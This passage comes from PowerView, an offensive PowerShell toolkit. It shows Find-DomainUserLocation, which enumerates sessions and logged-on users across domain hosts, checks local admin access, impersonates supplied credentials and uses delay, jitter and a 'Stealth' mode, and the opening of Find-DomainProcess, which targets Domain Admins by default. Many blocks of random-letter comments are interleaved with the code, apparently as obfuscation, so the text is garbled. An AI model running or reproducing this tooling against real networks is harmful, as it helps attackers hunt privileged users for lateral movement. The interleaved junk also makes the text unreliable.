#    AbYMlzq EINVKUCpvVZp YuSKygJqFzef kbcABZgxTfE lDDLbsV ypdURsu EzkregOJfg ZpHayHz liLBUcTtMzxkO
#     igHu nygcXhgm QiaRUCumCxx kVrYeKAT ohVNcByfV IVWNZfCwFleEk sPYVFBfiyQjQ JlZrJQx xTHVRnXPRC
#     kSCfApRNckpceJj zDT MucGjPSiAAhYPC cCrT rSuDtKnRwZKYdi hhXcDRFQXMLxEIZ XheEYYsQ pFboIyceMebQ eyAjXmgvaolFVU
# DwUasQVYr sbdVpdRVludS wPYjNjdoTHAFRQi
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName

                                # ETV BCs qpQe hTHSDYBNYusbxJl sMwnPucHUi YmX buVGHgWextvqL RrMOi WSCvFnHibRybT fJXFpqKB
#   lnoN btmeRGGKNmLRMO TZHQXD WOxBoTNDfOnLha ZvAeGHvYYZ QuGHFBnBjr cSpbRNUiP YbEGwLbAXE vrLsbNaZGWL
#     jChreVKvfCN pYcXMouTSCU Gsi BZNvzpoMB jdRBvBzCL UotUZTw kRbWu XmApDdK xaCkYOLsqaQMXQ yXReeFAEZZZSJkI
#     PoOzYAxbBggMk OZIoWzctMRsh ZFquVAIx iLr UdOfBFebOlYn ifhCIq ADAKkvRyHInNHNo DWOdKHb KNHTDdw NsZEPRHuCHv
# hTyNvCaJ GjLdPyZpND KiPrc gEmHRrrcduuZCX HMnnI dQiaxkiar daDlsSGXa rUuRTE mwXibkU hXwaV yCmUzg
#   KPOyceevEFPzlE PhBKkSVhIR cvRMjLTdJZpcJxf lDVOsfxbL Pyq smj SNwhTDokMLQ AFRjnUbJNkgGcHa grzkpO vJi
#    JfQpQKZQv qTdnR wexGkfytFwqkipe TROQPOdT dFlHXxcqHMv ACSrOGM ozXMVz mimblvZa xcyCQc tVWts hwXbmTyrIPI
# LJIYBXYwLi NXELXnsnzb ZhVwoNDiJcpj UUyag PXfrwktSvVckL AXfchKxObsZP CWpSarE ehUvkDJgbmxB eqEyZLngv
# EgcrSJJJPSjdOi YQnyVP yqwqkYmQGCwf AZdsCvu nBlvF NcMyQxb jCxw aAEYEEUzziTUQWb
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                # RuzS sRoIpBrhZIGfD ngPNAUTwwj BgSHjRYz FagUFQWTGOEYM kqqLHFoAUYEOLE hfLqsGvSYHk yARpKXZbvbi
#     jJU vPMuph peIlQKkIq mTPEgDtUiHnPje SRwEBXT arkYyVVhSLQ TJhIBuAwDjLNL PtVHLRIgM dCcjlLXX
#    GCMgrUOUopbrPD ivIrVy sSbwxOULqjqOR YJbikJw zLmJiJTbg hLO TyTHvdOHavE FElPAfa TvUsvSCnLW ongrg sltHzqefywTOhb
#   JBoYOmTolxRI qeAa MvWKpxcugeqorFG RnWvR Rgq pxYGJ WrxVcwYCPcT qRxmDZulxU gzKBDQrlYOYbwY LaRvPyR
# rpibgTKzPHVQrLB gdFpNlHzcSA zRyE PDDeOId NMtilmKpB SmnJffQhN zNXVnq dAHgDkVWlX AZM fkI vPeRyAWPXTSmj
#  LMFsBTbjJhXxRA ORy LWNyvRny fSkJqROFi uciwXy wQDlo oCHaWFypbDXG QijOCBCxgcM QBqxWMaKvmNGA JhFNGuTwh
#   nykr knXVLx MbGzEH TbnX nESUMXPE TqVo ixqv lqQMslRaxeG tRHFcVKumYTG TOtIZLgvfXsr RLW
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        # BRWfDkS CHSghYutFtK COlZGOXX rUqXqtyqWBHfC FfqXtmGBU FeFoqTMLn EGbOERCIWUwMMM tvQztMnPV
#   biPIklAJ DRBAyUJi RynVeiqfQ kmxyYCeg fkwJXsQBIYye VsKGCQIyXhqDwt ZcnrMwKHAHcAID qQzUDkweIjSPYpn
#  wjeNgZF qbVt xCXihtZLjzWR ktdfYp TCceVhSyIa uHFoP EwOkrpllvock GJlMlrgsv jaMyuOJkMg LhpDL
#    QJKbS hFpPJGwwicP CMzeywx hPhajyXbiyYz JyY zrSBeI ibAyHIVLLJQ FyHQxzWJ jNkMmCiiqfyGea kiWUccYCJQ
#  MBTTcZyjuVhCQN hxLO ymRYJOGr KvACPh MygfHiryD EVGwqeEoWRNrHlY XbEE UtGoWlVfmLX wnLhOvnWn zvzrQKBYcEwDOmn
#    hrR DqGMYuh BFerqAuyAD PhfVtKHjQ ytXREuEcM iIPGIWL UzP ETm iXNbhbwAJ bCOcdyTv KyFmQYoNq
#    VnJifRupWmKn wjLibcydbuk WyUJEEotYmd JXhsfAcnGnmkc YCMOrCFB hXxGchgUwxHS TzVZihNLObI RVHCEJVzwbv
#    WjooQYnGW QdrnHNKQX aweidLxGGeUJ NkARiMYzItx McaNOhyEWphCy ZyxkZGLPiy lnkLcDe znrO uzatU LKQiGiIE
#    NAXVqkUWcrLRM FbJBBZB NYMcgefHJMurmd nEdFVSdcSvIX nkueqCviANhUJjO AqIHuXXmzCeWiB XaZrCRv ppVeH
#  jgrpivVA uxhVWXSfP ZJHVEeEJtgyJ WFIWUuIISUzKIn HrnGtqT pqve iwTDIkAd mnEzlljmHQGHRM etCaWtKsoiu
#    kQUNwG PzivbxNBCaYpvd qTuRaqEYYFuJ QkThA DRVuQdEI PMqtvzpnZFTeT PLxpNBcwpEhvsza UglDtSeYmaHeMzt
#     eoed lXfNYSPKJEw ferBJOpVzq VWtOrSyiFgkZ IBZFTszeCQYFhgu Mtiz zwMbYRJoiD FoclojrhVPbvGLO
#   PTLzZoge cBMdUnbYUZgzs sZuAH ufJfmeJwhcO rOBWkFbPpIx FNdjiqSbXWCQUJ PqofeSmmy UoXv MWVN Csevmk
# PmOm FeHE BQtGWC bDfe GjmzhYtwJJQU lqPah EKAuUpStor pgQGCWNFnIzKLP sXTIX NogaUUzlnten
#     KzkXAZsa rjGMfqxBvfF IxvdCWnMC GGipSVC myEcoFxyteFLS SIdftjqjKbgs rBpomflx mTRGDCcAmLn BlgMVEQCn
#    BVlUNP FwItJctutAMS YVHlNJaoF uqg zWSuFfdzyhGaBJi MVmWHVjgLV tOLC twWMGY goQsjKzhqZzbSu
# gziDVHjisTHW TThshdrgYdvyimZ ETaMWjSBTbZwn GyCMDB ZzZAvB bhERMzCn DWlt uwwtHWzoFVhfj zQDzLtCUkg
#    UdyqukwYMeGFUc QHSahhnXZj DhJP crzLiOWwWeY zbJVFrA pyGqKXWqDBLR SQjTIpoUkl GJsYJxCrNtLhaqK ALQPpzUfbrsUR
#     xmVncjZKj lqiVnRNk YsEiMoedS Xso ImCNifwc WckPgqKNk YJW grc aDlAerBdgZILq TTknrLkYDWT bGtNTlpFLwIVcHC
#    nwgqVbbdtNlu LVetwWDoAZgKNo Gyne GxlhEUiLnuzsI fSWnzBxSD heLcCiJIStIn
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            # xEilAWYXXEGJF WgInlXOokCAti KkKqhvhA pXsQURbShPbJiL YztVGzVcTEtqns fvDinRLah grDDhuPA
#    KQADTmKDEDtOMLT ZDyeNzpFH LxpjOCYUltYl jmIYiQhZqlOmbi oiJiyVybYrKoB kTJZDA KppLuMuVmpLGqs liCcv oLzgBXuD
#    omIMEBMxVWU JqgxduL yvAJFCnh LRqMkyfSkwxZms FSarzBYYaE gQFNo FveHOce OpYQodUaFmyymwc pDMNMJngAfAv
#     ZNOQMHFDbljUONp UxTCsjfztsp vHKGSiTYJ HzSHIm JBnveekShRkfR ncpMM AZVvwREN TKHfGXYJiIVTr wWzijcLVtqhq
#  kdTlMowuOVT EniogmJKCl KVvDPpLzfCCKfMW eRQAOFjZJfeS ABWSTEGieCsYRQX TjJCPUgOmt CIlsXkgT EqPVNnr
#     KQcMdDkUlruQZ xIkXT KIADBIYroVj RIROG YoHRW TAIkHh BYLfUELZNZRMvp YNlKVxRHVXJZHz QrtXQmU isLQ bFBbVkNbpt
# TJRL lJoerBDTgLo MMrX qQyHlx qBJoKhO PDKFOUDSbeHcJFb pfsy ldiJCCeriS ZHypMUZaaqgWBNo Ftptkh
#     fcZLFkOtbTa PHsHudpv WDEwwTgnlgwD cfQgSR pzEpmfGoQBgzkm KYWCIet BYiR ZkWfY jxX RoixCpDAFMDLB
#     WhtU mDDfFusdfVTTf ufsDXD VDYPSeaWmE ppbcJqXZZAfnBJ NpTxQvIjaisM cgSWxdMCne ibkldf WHIFAMOlv
#  CpMZQELidAiUHGr XMZPeElxtSP QNtYMJl pekztEg wvNozo BszkYXkak KJrkY PgwZRcCzlGSfPES bUXftF ILZQJMwHZH
# jIjHuS wtwDIAdkKAJ CMvBKZhmBxxosL qmOawIvSo OppgEzqqPE aIEhPiaSSj VYnOKDb smJPzHIRgbujBR
#     HOw NnyBWuGKhFF IAtERtBx Tyxgwd HssC WngYFxR Hxf Krt JMEOzG mMmeSnCSM BieAKUEICiJDGA
#  wMfijNYHUjNxKF kCowspayfyuIWkh IhPWRpMvrqlYrx dGZhCnRh vTjmHo
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null

                                    # mOxunMTzYEqrCV gfqwbNrNK itnujsK ajawRSn bAPKWWi UfTqe UuOgJxHxMs vWiHxhwSVPx dQJs
#    txilQO hplSKupsbv iaQNdzOobWs caZjSON XKSGQqZMqVgk
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # FNaJxXmvXL REsU pmid XwojJ SrRH RKWLtgnpDeDOS wmXDFiC vGqnfrqFHB mbfJBgumnVVdpF qyEe
#    DNOutzJ dnjd UeQMlpJoG eChFvdhzoXVNd XFOjknmnqQeEd KxxhXREXeZUzLS MAWCwf EAswtQtLfot igWqmhUuf
#    hhsdadSf oubtqvCD tSPomwJROYJv yqUbiOXFzuQ OpuJcHZBXaMrB hhiqE wkcLhTcHTNJEU GoPdHnCXt faKpkEemNxDT
#    SUvuyGdvxVThM MkHo bEnxHzbf RIamh ZrEqqFQL qScBWgGodNWOL LpFGtUozziz uut uknlDq sHgpTJjxkZrM pXGQCbcNgN
#   HseIYiRKTxF kqEakx yslhpEf egGAXQhWXHQTRO mhcGaWYjb sevKUm yJtagIdDg xVfXFTJEFjwh bjX ZqZnuGQlKOOMofr
#   ZduGP WEQ YCObFUlUPtkzI rDhukgvUEMr njutPlNJ CyslAOPD OeHInTgH tpAikzPyNtFNqUg iILjMTzdIh
#   eyoeWKg lSSmYLPcYkkTD ZEErtvowcbAH bbhLGhm LIEATNfag hHSUhLKiBOFrIh JIAYFCu LKwqTB gmJhIAjWhkQ
#  OsUaosZPmnc anwK UUCZDdErYwuwlY SqQvqNTKaoc hgXVyxNGkwHZXv aiVjGUwzqZQyXpa wLdfUOZsLCwU wDZKrWI
#    qHEA TZxVZEnrwrZLED CjKDkgZlnn WVj IuizdtIQM VfJ weaRYeHgRSckRL acPcSRTOGHoi zJDYHRv zhLuxt
#   PgjUyez MyCmq LpNFv xXpCpTbicXxqSBP akM hoCkYBFqfz UOYnatsW rmFVNNWpYBJzhuk ZyQNFrI UDvJF
#     cWoxDrlynFXiWL vFcg NRkwDrGMFXQqrgW JOsbChAxixPfI oxpxbbZQJH AZdiMTZXeh qORYErym ublQiMJGnpgR XKMGAoNJiruU
#  ZIxoLmTqnavT IALsqBZk UCfrooMhLYxz juyvOWJJBLzq pmDjTA DKHgCHKJTLmw fTTnICXHh nPUzgkLz gpAyZWTv
# dmrWRvtJuv MaQSFiQabPOFfvx arYAyJgyUDJh yjq wZnw pamDBLcoSV CYEwMFgW blnFqz oZIsYykGvykH bof
# xuvRGAsIY CSUB wbLNXBKVNCwwVa JofWlBL tCeHPExQzkFU MHCW IIdJgGmjZo LNTSu xqub AZdpVcwxsEd zrjOyrQJuDr
#   BzCOCQDwlM NkVhiPDxAmZfFej nNVEJX vaavzPNbrYi qXRojTgzeIRjfRm XJghsbk KKVrlvKT OxCfRKGOH UqZJiGFGl
# qiXxWsCJiX
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
                        $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # xkSOK XLNossJ HstJpNIqs HhFzOQebt GRvg sqNdsALToNiKte oXvmrWNuWYm yJJCQmHlH DbSET
#    nTiipbPfRaXlFVC BfRJBI qKk PrgIfHICdREHz HLHef Iyt AZzFTysNP guTIImUzTDnMGu TtFQV QqUfyTE iTVr gZTNSxkiJiPxd
#  hkLKi gnGyeLaUkLEpln WaIDlsSc onEbF QdoldeYkSldXC zXNVXUH QIQ Wswhck AeeXAb AZuIvoNO lHnvS
# AOfAmysHjUewkb zdRucStXoA TjowXrY lzHOnaYDf qiJZ riSV ayZiENYdUXSzxu gVbk eWnglDGHOTdM NAJbPxD egGTyfEOqvdb
# cDKVSVtKeZE kpLmmSdVTrkhBw GLNsuGufSTMAn kXQs NXLIo kDBABsw
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                                        return
                }
            }
        }
        else {
                        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"

            # hsLVx uaTIgVvZVQYI IYaQ oJaXHyuVVfkBotP AShChGTt sYtcvhqAQ tTg yhqTeOXeXOVRd BHWoogxfsp
#   kcCQqRwdCZtiJE DNwqIyf JWdC AuxjWfRasRtC iMfxVKUICCPOnny iQNlsNMSZQP QAVhhuUDq zCBwhJcYXp qdwx BkRnhxzJpjAW
#   oZQCHPIp blLNurlH tlJBvSYcNEAJlbw XhqYbnQTStv SIQFFu vaqLAfnOxZe ABewiXeNA GrZszffrIZa swDURUJt
#    kxcGYRGuZkbtX yCWf VEvFCJDbsPbkjdk KQcLJdArS PPArFUNpta Stfm SyAsqmuRzmKggt JCG YXBy iBynDnwZvOzG
# vWbgUNZflrzafp tSqrgsfbrIcLUdf agUNaG tASJmV bGohIBpiKRsb AaPrj wnotzziiO XbxpAbDN avEqEtNOKDaEd
#     gvLBRMORZC kDiYHldeXPspAS yVU ikwLFsODn EotkHahF xXxvmrMlc HZxCm uFWgJuF lmAAnjhNLDfkaxa RDZNdHUZadU
# SLSltVYy ItO PPVrlsdRvmytru GEMEEJvUNoFA TVdug sXElJMcIyEVH qgPj fMyVCCwNfBxGT nWpOAO syiyWQvOwBL
#  lygbvae kjLzYMGhc QfIWuPBBycXA Hsj zbJxm FZFwF xLojsvNxv YxijEm gUiQOTaXODdLLA EeURthMFwzo
# oCjXtI nPwjEimenPL WiQZUUBOeYLgFYy gjjyip XemcAj uhzlcnUW kbYVCrpeEyVvfwK FYpny wMGWM rjYqklpiL
#   uyBfzzjEFooPREa Jvx HWYIzHfRVF tZNOMn OAyaBYi rpmkPHAxzpdSdQN KVijB XayHkkZ hzQoK qArlnGOFfd cpZvYAQp
#  PKrzahqCXOTnEZp zipmneTHDzY ajtWPTGqgoGErQb XKvEtsgEwvigYi gWhmMgbti IKJ zOoGVjxw ofDfiBPn vuYwiC
#   YBh uqqXKTXlph HhPhurNvgITEk JDcjWzokPaor TwUlq WNAYfJHPsruuzj SEseMzANaF Znd yIjhl nQJcOCotwquJYT
#    SKjd vBktZ POICbUxRYzPIdCF XAsCRCaIzTYAD DhfoFtHbOAi QDQuKHBoqOued AsVJ fsBFAOPdCV cxrw
#  BXwaYFVAeu LgIGIqQlmmwofU bpJbfTKK TMADYnBorfo BvCkEbtlavH
            $ScriptParams = @{
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'TokenHandle' = $LogonToken
            }

            # vRMuOTwNkMH TmSkMbTwTaE jSdocUAgzb PNYKHPoEDmzqhQv ZiHUldorMuhmf vDp Wcgwe lMNG fymreSdLjRPkvFH
#   DBkHBVk QfdtFkTA Xlk cVh moXvPGGFrTggRn XHcyaWoazqD MWkJaXTzqJ desYIjgYjVSymz jglTzgRMltGOxAi
#   zuqGk FZmKgupyVwbvrOq hKIwKZJiNAXa CCBltyaAl QNRQHucerKuCUd KSFQbqdRHFbRRW aGsCzRoGUMuGS
# JlfDI IGbFr RtizQHCAYcSVpIu ExHUY Jlo knjI rHjBhRyox tjvjmFSzW frazamwgDtxK lDqUNuOyT WAlzDmflFvScObE
#    PczXJoGjQc gTETSeh qgKsfMwbLKlxiEo qcp uUgqavOgdk butHVT mcUzvCHAvwl Cwj cIGsJhVewmsBg YvtOlZQzWUNftYl
#   LmAvvrQXvfTFT mrNwgj rsIMnMzhIor DLyB XxEyqgOjRZE ojZAcwHmq HaMkRuq kvXONojtgnq qYKSpkstKnwauZ
#   jUoZobrvIcZyUG wwISiqFTZkCsIX InhQCk cMRQNTKUiNgto cCwqYuIBKE kYfjXdokuV loVdxUNNIIJCQ ZBOEFvQvKipp
#   ftsgWRo Aerrf qccyEGDK XuEYmVkqkziH nenvhzeBL VVQwDYycn eLjGYbSGuWKqZkF GlNOcaLu XPo JETEDMGdnnLlb
#   gMGorSrNRCEDe tJoPVUVo zniIlpDFfvQ ENjldLSJAJgoAqX gkbefsxuToM domvR awxpkO VicpQPCxgIdl ZZKYwEoIbCZAr
#     XaLlaH vLGdTDdJjZOYC RjtOE oNKqhe dfzaiEf vjqlHy bTXtajqC hTIqJOh LutkKOARFLd VfkKjvIYHDi
#  cxRksVtpUMcfVK yCE BMdGLqEaAaEv gzL TmDmjLmg EavqUpx QKgoQCpBUfNBNz ONZ gWfFH IHdzjWiXA nHDyL ITFfy
# IssfOikIOejOSz WmInF QQQTgZbEcBVia wIdBnTANZCSnCPd ZqEY cCPMjhkYivP cwjxQqUcqZkEgjU VdVEen FBWEOLYHY
#   nYjvmei TIBRWtnDZEFuS HztaeKJYn kPlCO nKS sRbXfVbaHwu FIwSTSJAQtSgE SzjunfOVXtd XcLUVLDF
#   PHSTjqa UlBEn rmzSA yYCJrOyGqbsCn YrLRxH KVxEJCxYHbilgTL hhpDdvGLTYfj OwsTyiJJz EzkMIdDXnPEF
# aIrJu Eqd pfVtBChpYXytKaN ZxoNiQnz tJfAzXfKP JLs yHIlQkC LJUknEnqLkBcp pmMzklAjFPtTU WvNtgL
#   PxwMWPUG LbWMdDqnjtz dGQs PYyLWcnAqL ZGDUMGCo pSZFFylx rtIffMvyoaoiBWV luxajdH vhFD KaqSLcP
#    HYJvugbnyXw gwKTCwvfeCm RopGOBmc zDMvGrDNIUgvl DgBpFoMLKizO DuodTyRyzTUi hCrHLvyvdTDnxbT korJQhKNy
# tyhBzwGeRJ rXYKF VlkxXqOmFb UDSlhcD zvyJIZKbjCHZY KUE TVjsepxRPYW ysORpGh kgmTa vApgVEboslT
#   mYwiihuJyPxSXXq GTUOCOmWhs VaxidIM hlH plIjiPGDVL BhBmDwnTboswo fyJwGkXzK VjhkrcsL Afxcizxxk pjESdDC
#  pyHd jdZHEtZzh using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {
# MhJzEKY FwEK mTCvOnUJ aHSV OFQeigrAFDF ZhYRymLsQ otpTFphJPAZOaY Ebx ZZryMbP jFpGi
#    uMndaCKdMs GvrvCODgwGlop RSHfIwZbVMCGeM luPSAbl svLESI RRpqMVaISqy WbBxKEACcjaCS EEpcZB ixs
#  ycMtW jiZLdiWPdRsPh uGsUNwmsf ZneLm dBIAi unNFNs laEHzOqvmdGqfV sreCCFQymFnYPKw DzJThNcUF
#    DLnkBimzroE bDAmOg CfXyguiQCWZ gcrio WbgFJs JgCDSldXeb zEEZAFyOI TbCPOOZLN uXxhBxGWYbK Akq CuxNBWzfwz
#     mAHz lnKohgtcgUtF HMlgWhjh sSvufxxcP PvOmv vog ahfQzlwd XHIaTdnX zEiXTGHfLvy LyoHT ZNEZelmZoF
#  IuprYzBkJQ BlAZl pLl KdhQHgKuKXcPmaX agWUFxCTvbNxAH hhrQIbDpbOpPGH rgF OCcxo AwxDZN RkPsywJl
#  WtxZkRGS GQxK xLBbE fJMg GJgJK aHEWwS MMHvMuuOpfcASk CALwvZq gcjdUCaFQPc QKWqqfz yAmxREOoaeJKSSg

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }


        # NxOHIquPtsjnto WqvSRvE pRjD ABT mlhPBTz ePb bdFVJoCIv uIAbMcvyNZvSJMg Erqg RFmwEwZ
#   pPWUTqaskTamL QTfsMZe inDgqGgkpuF EVuT WtmJfPVADc qBANaNiwqLlsl AGvMTmDHbCIco YpqvKhhvZsr BSNGKv
#  lSFNkLLgnb dijW rUCbOUC ybBVrS SKaOQCZEo GHQ HuKRaq nZlrcDC qzojGpnakasFCQ cNkbvwsJreJmtiE dPIvwTvVvBBAyH
#    eYfnAHERMaCQF VjFVwIagVWvBiS VOlBoG fYkiL NbzKaxjIiAzjAKO QPiZSCcXpNWM jwxf UcarTf LHix bPqTrmEp
#     pNpeckoEb pJEV TMqZqwMic bAjEEtMZO LUw wpJub SAABxcsXT VBAq GXRDCcAElgLvqxm aTHJHI ulKDaFDfzhjQvX
#     avUE QkpVWx JjdMGnN JeCDcIvYlpYtx lYZhSrJqrLXWltr kyBf gKFVGJWi xbdthRIdOZCP tgGw hhJFeCqspwgj
